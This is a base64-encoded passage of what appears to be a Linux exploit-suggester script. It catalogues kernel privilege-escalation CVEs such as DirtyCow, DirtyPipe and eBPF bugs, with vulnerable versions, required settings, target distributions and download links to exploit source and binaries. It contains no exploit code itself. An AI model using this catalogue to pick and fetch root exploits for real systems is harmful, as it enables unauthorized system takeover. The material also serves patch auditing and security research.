Y2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNi01MTk1XSR7dHh0cnN0fSBkaXJ0eWNvdwpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjIyLHZlcjw9NC44LjMKVGFnczogZGViaWFuPTd8OCxSSEVMPTV7a2VybmVsOjIuNi4oMTh8MjR8MzMpLSp9LFJIRUw9NntrZXJuZWw6Mi42LjMyLSp8My4oMHwyfDZ8OHwxMCkuKnwyLjYuMzMuOS1ydDMxfSxSSEVMPTd7a2VybmVsOjMuMTAuMC0qfDQuMi4wLTAuMjEuZWw3fSx1YnVudHU9MTYuMDR8MTQuMDR8MTIuMDQKUmFuazogNAphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9kaXJ0eWNvdy9kaXJ0eWNvdy5naXRodWIuaW8vd2lraS9WdWxuZXJhYmlsaXR5RGV0YWlscwpDb21tZW50czogRm9yIFJIRUwvQ2VudE9TIHNlZSBleGFjdCB2dWxuZXJhYmxlIHZlcnNpb25zIGhlcmU6IGh0dHBzOi8vYWNjZXNzLnJlZGhhdC5jb20vc2l0ZXMvZGVmYXVsdC9maWxlcy9yaC1jdmUtMjAxNi01MTk1XzUuc2gKZXhwbG9pdC1kYjogNDA2MTEKYXV0aG9yOiBQaGlsIE9lc3RlcgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTUxOTVdJHt0eHRyc3R9IGRpcnR5Y293IDIKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4yMix2ZXI8PTQuOC4zClRhZ3M6IGRlYmlhbj03fDgsUkhFTD01fDZ8Nyx1YnVudHU9MTQuMDR8MTIuMDQsdWJ1bnR1PTEwLjA0e2tlcm5lbDoyLjYuMzItMjEtZ2VuZXJpY30sdWJ1bnR1PTE2LjA0e2tlcm5lbDo0LjQuMC0yMS1nZW5lcmljfQpSYW5rOiA0CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL2RpcnR5Y293L2RpcnR5Y293LmdpdGh1Yi5pby93aWtpL1Z1bG5lcmFiaWxpdHlEZXRhaWxzCmV4dC11cmw6IGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tL2Rvd25sb2FkLzQwODQ3CkNvbW1lbnRzOiBGb3IgUkhFTC9DZW50T1Mgc2VlIGV4YWN0IHZ1bG5lcmFibGUgdmVyc2lvbnMgaGVyZTogaHR0cHM6Ly9hY2Nlc3MucmVkaGF0LmNvbS9zaXRlcy9kZWZhdWx0L2ZpbGVzL3JoLWN2ZS0yMDE2LTUxOTVfNS5zaApleHBsb2l0LWRiOiA0MDgzOQphdXRob3I6IEZpcmVGYXJ0IChhdXRob3Igb2YgZXhwbG9pdCBhdCBFREIgNDA4MzkpOyBHYWJyaWVsZSBCb25hY2luaSAoYXV0aG9yIG9mIGV4cGxvaXQgYXQgJ2V4dC11cmwnKQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTg2NTVdJHt0eHRyc3R9IGNob2NvYm9fcm9vdApSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49NC40LjAsdmVyPDQuOSxDT05GSUdfVVNFUl9OUz15LHN5c2N0bDprZXJuZWwudW5wcml2aWxlZ2VkX3VzZXJuc19jbG9uZT09MQpUYWdzOiB1YnVudHU9KDE0LjA0fDE2LjA0KXtrZXJuZWw6NC40LjAtKDIxfDIyfDI0fDI4fDMxfDM0fDM2fDM4fDQyfDQzfDQ1fDQ3fDUxKS1nZW5lcmljfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTYvMTIvMDYvMQpDb21tZW50czogQ0FQX05FVF9SQVcgY2FwYWJpbGl0eSBpcyBuZWVkZWQgT1IgQ09ORklHX1VTRVJfTlM9eSBuZWVkcyB0byBiZSBlbmFibGVkCmJpbi11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsvbWFzdGVyL2RhdGEvZXhwbG9pdHMvQ1ZFLTIwMTYtODY1NS9jaG9jb2JvX3Jvb3QKZXhwbG9pdC1kYjogNDA4NzEKYXV0aG9yOiByZWJlbApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTk3OTNdJHt0eHRyc3R9IFNPX3tTTkR8UkNWfUJVRkZPUkNFClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjExLHZlcjw0LjguMTQsQ09ORklHX1VTRVJfTlM9eSxzeXNjdGw6a2VybmVsLnVucHJpdmlsZWdlZF91c2VybnNfY2xvbmU9PTEKVGFnczoKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS94YWlyeS9rZXJuZWwtZXhwbG9pdHMvdHJlZS9tYXN0ZXIvQ1ZFLTIwMTYtOTc5MwpzcmMtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veGFpcnkva2VybmVsLWV4cGxvaXRzL21hc3Rlci9DVkUtMjAxNi05NzkzL3BvYy5jCkNvbW1lbnRzOiBDQVBfTkVUX0FETUlOIGNhcHMgT1IgQ09ORklHX1VTRVJfTlM9eSBuZWVkZWQuIE5vIFNNRVAvU01BUC9LQVNMUiBieXBhc3MgaW5jbHVkZWQuIFRlc3RlZCBpbiBRRU1VIG9ubHkKZXhwbG9pdC1kYjogNDE5OTUKYXV0aG9yOiBBbmRyZXkgJ3hhaXJ5JyBLb25vdmFsb3YKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNy02MDc0XSR7dHh0cnN0fSBkY2NwClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMTgsdmVyPD00LjkuMTEsQ09ORklHX0lQX0RDQ1A9W215XQpUYWdzOiB1YnVudHU9KDE0LjA0fDE2LjA0KXtrZXJuZWw6NC40LjAtNjItZ2VuZXJpY30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly93d3cub3BlbndhbGwuY29tL2xpc3RzL29zcy1zZWN1cml0eS8yMDE3LzAyLzIyLzMKQ29tbWVudHM6IFJlcXVpcmVzIEtlcm5lbCBiZSBidWlsdCB3aXRoIENPTkZJR19JUF9EQ0NQIGVuYWJsZWQuIEluY2x1ZGVzIHBhcnRpYWwgU01FUC9TTUFQIGJ5cGFzcwpleHBsb2l0LWRiOiA0MTQ1OAphdXRob3I6IEFuZHJleSAneGFpcnknIEtvbm92YWxvdgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTczMDhdJHt0eHRyc3R9IGFmX3BhY2tldApSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4yLHZlcjw9NC4xMC42LENPTkZJR19VU0VSX05TPXksc3lzY3RsOmtlcm5lbC51bnByaXZpbGVnZWRfdXNlcm5zX2Nsb25lPT0xClRhZ3M6IHVidW50dT0xNi4wNHtrZXJuZWw6NC44LjAtKDM0fDM2fDM5fDQxfDQyfDQ0fDQ1KS1nZW5lcmljfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9nb29nbGVwcm9qZWN0emVyby5ibG9nc3BvdC5jb20vMjAxNy8wNS9leHBsb2l0aW5nLWxpbnV4LWtlcm5lbC12aWEtcGFja2V0Lmh0bWwKc3JjLXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hhaXJ5L2tlcm5lbC1leHBsb2l0cy9tYXN0ZXIvQ1ZFLTIwMTctNzMwOC9wb2MuYwpleHQtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmNvbGVzL2tlcm5lbC1leHBsb2l0cy9tYXN0ZXIvQ1ZFLTIwMTctNzMwOC9wb2MuYwpDb21tZW50czogQ0FQX05FVF9SQVcgY2FwIG9yIENPTkZJR19VU0VSX05TPXkgbmVlZGVkLiBNb2RpZmllZCB2ZXJzaW9uIGF0ICdleHQtdXJsJyBhZGRzIHN1cHBvcnQgZm9yIGFkZGl0aW9uYWwga2VybmVscwpiaW4tdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrL21hc3Rlci9kYXRhL2V4cGxvaXRzL2N2ZS0yMDE3LTczMDgvZXhwbG9pdApleHBsb2l0LWRiOiA0MTk5NAphdXRob3I6IEFuZHJleSAneGFpcnknIEtvbm92YWxvdiAob3JnaW5hbCBleHBsb2l0IGF1dGhvcik7IEJyZW5kYW4gQ29sZXMgKGF1dGhvciBvZiBleHBsb2l0IHVwZGF0ZSBhdCAnZXh0LXVybCcpCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTctMTY5OTVdJHt0eHRyc3R9IGVCUEZfdmVyaWZpZXIKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTQuNCx2ZXI8PTQuMTQuOCxDT05GSUdfQlBGX1NZU0NBTEw9eSxzeXNjdGw6a2VybmVsLnVucHJpdmlsZWdlZF9icGZfZGlzYWJsZWQhPTEKVGFnczogZGViaWFuPTkuMHtrZXJuZWw6NC45LjAtMy1hbWQ2NH0sZmVkb3JhPTI1fDI2fDI3LHVidW50dT0xNC4wNHtrZXJuZWw6NC40LjAtODktZ2VuZXJpY30sdWJ1bnR1PSgxNi4wNHwxNy4wNCl7a2VybmVsOjQuKDh8MTApLjAtKDE5fDI4fDQ1KS1nZW5lcmljfQpSYW5rOiA1CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9yaWNrbGFyYWJlZS5ibG9nc3BvdC5jb20vMjAxOC8wNy9lYnBmLWFuZC1hbmFseXNpcy1vZi1nZXQtcmVrdC1saW51eC5odG1sCkNvbW1lbnRzOiBDT05GSUdfQlBGX1NZU0NBTEwgbmVlZHMgdG8gYmUgc2V0ICYmIGtlcm5lbC51bnByaXZpbGVnZWRfYnBmX2Rpc2FibGVkICE9IDEKYmluLXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yay9tYXN0ZXIvZGF0YS9leHBsb2l0cy9jdmUtMjAxNy0xNjk5NS9leHBsb2l0Lm91dApleHBsb2l0LWRiOiA0NTAxMAphdXRob3I6IFJpY2sgTGFyYWJlZQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTEwMDAxMTJdJHt0eHRyc3R9IE5FVElGX0ZfVUZPClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj00LjQsdmVyPD00LjEzLENPTkZJR19VU0VSX05TPXksc3lzY3RsOmtlcm5lbC51bnByaXZpbGVnZWRfdXNlcm5zX2Nsb25lPT0xClRhZ3M6IHVidW50dT0xNC4wNHtrZXJuZWw6NC40LjAtKn0sdWJ1bnR1PTE2LjA0e2tlcm5lbDo0LjguMC0qfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTcvMDgvMTMvMQpzcmMtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veGFpcnkva2VybmVsLWV4cGxvaXRzL21hc3Rlci9DVkUtMjAxNy0xMDAwMTEyL3BvYy5jCmV4dC11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iY29sZXMva2VybmVsLWV4cGxvaXRzL21hc3Rlci9DVkUtMjAxNy0xMDAwMTEyL3BvYy5jCkNvbW1lbnRzOiBDQVBfTkVUX0FETUlOIGNhcCBvciBDT05GSUdfVVNFUl9OUz15IG5lZWRlZC4gU01FUC9LQVNMUiBieXBhc3MgaW5jbHVkZWQuIE1vZGlmaWVkIHZlcnNpb24gYXQgJ2V4dC11cmwnIGFkZHMgc3VwcG9ydCBmb3IgYWRkaXRpb25hbCBkaXN0cm9zL2tlcm5lbHMKYmluLXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yay9tYXN0ZXIvZGF0YS9leHBsb2l0cy9jdmUtMjAxNy0xMDAwMTEyL2V4cGxvaXQub3V0CmV4cGxvaXQtZGI6CmF1dGhvcjogQW5kcmV5ICd4YWlyeScgS29ub3ZhbG92IChvcmdpbmFsIGV4cGxvaXQgYXV0aG9yKTsgQnJlbmRhbiBDb2xlcyAoYXV0aG9yIG9mIGV4cGxvaXQgdXBkYXRlIGF0ICdleHQtdXJsJykKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNy0xMDAwMjUzXSR7dHh0cnN0fSBQSUVfc3RhY2tfY29ycnVwdGlvbgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4yLHZlcjw9NC4xMyx4ODZfNjQKVGFnczogUkhFTD02LFJIRUw9N3trZXJuZWw6My4xMC4wLTUxNC4yMS4yfDMuMTAuMC01MTQuMjYuMX0KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAxNy8wOS8yNi9saW51eC1waWUtY3ZlLTIwMTctMTAwMDI1My9jdmUtMjAxNy0xMDAwMjUzLnR4dApzcmMtdXJsOiBodHRwczovL3d3dy5xdWFseXMuY29tLzIwMTcvMDkvMjYvbGludXgtcGllLWN2ZS0yMDE3LTEwMDAyNTMvY3ZlLTIwMTctMTAwMDI1My5jCmV4cGxvaXQtZGI6IDQyODg3CmF1dGhvcjogUXVhbHlzCkNvbW1lbnRzOgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE4LTUzMzNdJHt0eHRyc3R9IHJkc19hdG9taWNfZnJlZV9vcCBOVUxMIHBvaW50ZXIgZGVyZWZlcmVuY2UKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTQuNCx2ZXI8PTQuMTQuMTMsY21kOmdyZXAgLXFpIHJkcyAvcHJvYy9tb2R1bGVzLHg4Nl82NApUYWdzOiB1YnVudHU9MTYuMDR7a2VybmVsOjQuNC4wfDQuOC4wfQpSYW5rOiAxCnNyYy11cmw6IGh0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vd2Jvd2xpbmcvOWQzMjQ5MmJkOTZkOWU3YzNiZjUyZTIzYTBhYzMwYTQvcmF3Lzk1OTMyNTgxOWM3ODI0OGE2NDM3MTAyYmIyODliYjg1NzhhMTM1Y2QvY3ZlLTIwMTgtNTMzMy1wb2MuYwpleHQtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmNvbGVzL2tlcm5lbC1leHBsb2l0cy9tYXN0ZXIvQ1ZFLTIwMTgtNTMzMy9jdmUtMjAxOC01MzMzLmMKQ29tbWVudHM6IHJkcy5rbyBrZXJuZWwgbW9kdWxlIG5lZWRzIHRvIGJlIGxvYWRlZC4gTW9kaWZpZWQgdmVyc2lvbiBhdCAnZXh0LXVybCcgYWRkcyBzdXBwb3J0IGZvciBhZGRpdGlvbmFsIHRhcmdldHMgYW5kIGJ5cGFzc2luZyBLQVNMUi4KYXV0aG9yOiB3Ym93bGluZyAob3JnaW5hbCBleHBsb2l0IGF1dGhvcik7IGJjb2xlcyAoYXV0aG9yIG9mIGV4cGxvaXQgdXBkYXRlIGF0ICdleHQtdXJsJykKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxOC0xODk1NV0ke3R4dHJzdH0gc3VidWlkX3NoZWxsClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj00LjE1LHZlcjw9NC4xOS4yLENPTkZJR19VU0VSX05TPXksc3lzY3RsOmtlcm5lbC51bnByaXZpbGVnZWRfdXNlcm5zX2Nsb25lPT0xLGNtZDpbIC11IC91c3IvYmluL25ld3VpZG1hcCBdLGNtZDpbIC11IC91c3IvYmluL25ld2dpZG1hcCBdClRhZ3M6IHVidW50dT0xOC4wNHtrZXJuZWw6NC4xNS4wLTIwLWdlbmVyaWN9LGZlZG9yYT0yOHtrZXJuZWw6NC4xNi4zLTMwMS5mYzI4fQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9idWdzLmNocm9taXVtLm9yZy9wL3Byb2plY3QtemVyby9pc3N1ZXMvZGV0YWlsP2lkPTE3MTIKc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0ZGItYmluLXNwbG9pdHMvcmF3L21hc3Rlci9iaW4tc3Bsb2l0cy80NTg4Ni56aXAKZXhwbG9pdC1kYjogNDU4ODYKYXV0aG9yOiBKYW5uIEhvcm4KQ29tbWVudHM6IENPTkZJR19VU0VSX05TIG5lZWRzIHRvIGJlIGVuYWJsZWQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxOS0xMzI3Ml0ke3R4dHJzdH0gUFRSQUNFX1RSQUNFTUUKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTQsdmVyPDUuMS4xNyxzeXNjdGw6a2VybmVsLnlhbWEucHRyYWNlX3Njb3BlPT0wLHg4Nl82NApUYWdzOiB1YnVudHU9MTYuMDR7a2VybmVsOjQuMTUuMC0qfSx1YnVudHU9MTguMDR7a2VybmVsOjQuMTUuMC0qfSxkZWJpYW49OXtrZXJuZWw6NC45LjAtKn0sZGViaWFuPTEwe2tlcm5lbDo0LjE5LjAtKn0sZmVkb3JhPTMwe2tlcm5lbDo1LjAuOS0qfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9idWdzLmNocm9taXVtLm9yZy9wL3Byb2plY3QtemVyby9pc3N1ZXMvZGV0YWlsP2lkPTE5MDMKc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0ZGItYmluLXNwbG9pdHMvcmF3L21hc3Rlci9iaW4tc3Bsb2l0cy80NzEzMy56aXAKZXh0LXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jjb2xlcy9rZXJuZWwtZXhwbG9pdHMvbWFzdGVyL0NWRS0yMDE5LTEzMjcyL3BvYy5jCkNvbW1lbnRzOiBSZXF1aXJlcyBhbiBhY3RpdmUgUG9sS2l0IGFnZW50LgpleHBsb2l0LWRiOiA0NzEzMwpleHBsb2l0LWRiOiA0NzE2MwphdXRob3I6IEphbm4gSG9ybiAob3JnaW5hbCBleHBsb2l0IGF1dGhvcik7IGJjb2xlcyAoYXV0aG9yIG9mIGV4cGxvaXQgdXBkYXRlIGF0ICdleHQtdXJsJykKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxOS0xNTY2Nl0ke3R4dHJzdH0gWEZSTV9VQUYKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMsdmVyPDUuMC4xOSxDT05GSUdfVVNFUl9OUz15LHN5c2N0bDprZXJuZWwudW5wcml2aWxlZ2VkX3VzZXJuc19jbG9uZT09MSxDT05GSUdfWEZSTT15ClRhZ3M6ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2R1YXN5bnQuY29tL2Jsb2cvdWJ1bnR1LWNlbnRvcy1yZWRoYXQtcHJpdmVzYwpiaW4tdXJsOiBodHRwczovL2dpdGh1Yi5jb20vZHVhc3ludC94ZnJtX3BvYy9yYXcvbWFzdGVyL2x1Y2t5MApDb21tZW50czogQ09ORklHX1VTRVJfTlMgbmVlZHMgdG8gYmUgZW5hYmxlZDsgQ09ORklHX1hGUk0gbmVlZHMgdG8gYmUgZW5hYmxlZAphdXRob3I6IFZpdGFseSAndm5paycgTmlrb2xlbmtvCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMjEtMjczNjVdJHt0eHRyc3R9IGxpbnV4LWlzY3NpClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPD01LjExLjMsQ09ORklHX1NMQUJfRlJFRUxJU1RfSEFSREVORUQhPXkKVGFnczogUkhFTD04ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2Jsb2cuZ3JpbW0tY28uY29tLzIwMjEvMDMvbmV3LW9sZC1idWdzLWluLWxpbnV4LWtlcm5lbC5odG1sCnNyYy11cmw6IGh0dHBzOi8vY29kZWxvYWQuZ2l0aHViLmNvbS9ncmltbS1jby9Ob3RRdWl0ZTBEYXlGcmlkYXkvemlwL3RydW5rCkNvbW1lbnRzOiBDT05GSUdfU0xBQl9GUkVFTElTVF9IQVJERU5FRCBtdXN0IG5vdCBiZSBlbmFibGVkCmF1dGhvcjogR1JJTU0KRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAyMS0zNDkwXSR7dHh0cnN0fSBlQlBGIEFMVTMyIGJvdW5kcyB0cmFja2luZyBmb3IgYml0d2lzZSBvcHMKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTUuNyx2ZXI8NS4xMixDT05GSUdfQlBGX1NZU0NBTEw9eSxzeXNjdGw6a2VybmVsLnVucHJpdmlsZWdlZF9icGZfZGlzYWJsZWQhPTEKVGFnczogdWJ1bnR1PTIwLjA0e2tlcm5lbDo1LjguMC0oMjV8MjZ8Mjd8Mjh8Mjl8MzB8MzF8MzJ8MzN8MzR8MzV8MzZ8Mzd8Mzh8Mzl8NDB8NDF8NDJ8NDN8NDR8NDV8NDZ8NDd8NDh8NDl8NTB8NTF8NTIpLSp9LHVidW50dT0yMS4wNHtrZXJuZWw6NS4xMS4wLTE2LSp9ClJhbms6IDUKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5ncmFwbHNlY3VyaXR5LmNvbS9wb3N0L2tlcm5lbC1wd25pbmctd2l0aC1lYnBmLWEtbG92ZS1zdG9yeQpzcmMtdXJsOiBodHRwczovL2NvZGVsb2FkLmdpdGh1Yi5jb20vY2hvbXBpZTEzMzcvTGludXhfTFBFX2VCUEZfQ1ZFLTIwMjEtMzQ5MC96aXAvbWFpbgpDb21tZW50czogQ09ORklHX0JQRl9TWVNDQUxMIG5lZWRzIHRvIGJlIHNldCAmJiBrZXJuZWwudW5wcml2aWxlZ2VkX2JwZl9kaXNhYmxlZCAhPSAxCmF1dGhvcjogY2hvbXBpZTEzMzcKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAyMS0yMjU1NV0ke3R4dHJzdH0gTmV0ZmlsdGVyIGhlYXAgb3V0LW9mLWJvdW5kcyB3cml0ZQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjE5LHZlcjw9NS4xMi1yYzYKVGFnczogdWJ1bnR1PTIwLjA0e2tlcm5lbDo1LjguMC0qfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9nb29nbGUuZ2l0aHViLmlvL3NlY3VyaXR5LXJlc2VhcmNoL3BvY3MvbGludXgvY3ZlLTIwMjEtMjI1NTUvd3JpdGV1cC5odG1sCnNyYy11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9nb29nbGUvc2VjdXJpdHktcmVzZWFyY2gvbWFzdGVyL3BvY3MvbGludXgvY3ZlLTIwMjEtMjI1NTUvZXhwbG9pdC5jCmV4dC11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iY29sZXMva2VybmVsLWV4cGxvaXRzL21hc3Rlci9DVkUtMjAyMS0yMjU1NS9leHBsb2l0LmMKQ29tbWVudHM6IGlwX3RhYmxlcyBrZXJuZWwgbW9kdWxlIG11c3QgYmUgbG9hZGVkCmV4cGxvaXQtZGI6IDUwMTM1CmF1dGhvcjogdGhlZmxvdyAob3JnaW5hbCBleHBsb2l0IGF1dGhvcik7IGJjb2xlcyAoYXV0aG9yIG9mIGV4cGxvaXQgdXBkYXRlIGF0ICdleHQtdXJsJykKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAyMi0wODQ3XSR7dHh0cnN0fSBEaXJ0eVBpcGUKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTUuOCx2ZXI8PTUuMTYuMTEKVGFnczogdWJ1bnR1PSgyMC4wNHwyMS4wNCksZGViaWFuPTExClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2RpcnR5cGlwZS5jbTRhbGwuY29tLwpzcmMtdXJsOiBodHRwczovL2hheHguaW4vZmlsZXMvZGlydHlwaXBlei5jCmV4cGxvaXQtZGI6IDUwODA4CmF1dGhvcjogYmxhc3R5IChvcmlnaW5hbCBleHBsb2l0IGF1dGhvcjogTWF4IEtlbGxlcm1hbm4pCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMjItMjU4Nl0ke3R4dHJzdH0gbmZ0X29iamVjdCBVQUYKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuMTYsQ09ORklHX1VTRVJfTlM9eSxzeXNjdGw6a2VybmVsLnVucHJpdmlsZWdlZF91c2VybnNfY2xvbmU9PTEKVGFnczogdWJ1bnR1PSgyMC4wNCl7a2VybmVsOjUuMTIuMTN9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMjIvMDgvMjkvNQpzcmMtdXJsOiBodHRwczovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMjIvMDgvMjkvNS8xCkNvbW1lbnRzOiBrZXJuZWwudW5wcml2aWxlZ2VkX3VzZXJuc19jbG9uZT0xIHJlcXVpcmVkICh0byBvYnRhaW4gQ0FQX05FVF9BRE1JTikKYXV0aG9yOiB2dWxuZXJhYmlsaXR5IGRpc2NvdmVyeTogVGVhbSBPcmNhIG9mIFNlYSBTZWN1cml0eTsgRXhwbG9pdCBhdXRob3I6IEFsZWphbmRybyBHdWVycmVybwpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDIyLTMyMjUwXSR7dHh0cnN0fSBuZnRfb2JqZWN0IFVBRiAoTkZUX01TR19ORVdTRVQpClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPDUuMTguMSxDT05GSUdfVVNFUl9OUz15LHN5c2N0bDprZXJuZWwudW5wcml2aWxlZ2VkX3VzZXJuc19jbG9uZT09MQpUYWdzOiB1YnVudHU9KDIyLjA0KXtrZXJuZWw6NS4xNS4wLTI3LWdlbmVyaWN9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3Jlc2VhcmNoLm5jY2dyb3VwLmNvbS8yMDIyLzA5LzAxL3NldHRsZXJzLW9mLW5ldGxpbmstZXhwbG9pdGluZy1hLWxpbWl0ZWQtdWFmLWluLW5mX3RhYmxlcy1jdmUtMjAyMi0zMjI1MC8KYW5hbHlzaXMtdXJsOiBodHRwczovL2Jsb2cudGhlb3JpLmlvL3Jlc2VhcmNoL0NWRS0yMDIyLTMyMjUwLWxpbnV4LWtlcm5lbC1scGUtMjAyMi8Kc3JjLXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RoZW9yaS1pby9DVkUtMjAyMi0zMjI1MC1leHBsb2l0L21haW4vZXhwLmMKQ29tbWVudHM6IGtlcm5lbC51bnByaXZpbGVnZWRfdXNlcm5zX2Nsb25lPTEgcmVxdWlyZWQgKHRvIG9idGFpbiBDQVBfTkVUX0FETUlOKQphdXRob3I6IHZ1bG5lcmFiaWxpdHkgZGlzY292ZXJ5OiBFREcgVGVhbSBmcm9tIE5DQyBHcm91cDsgQXV0aG9yIG9mIHRoaXMgZXhwbG9pdDogdGhlb3JpLmlvCkVPRgopCgoKIyMjIyMjIyMjIyMjIFVTRVJTUEFDRSBFWFBMT0lUUyAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKbj0wCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt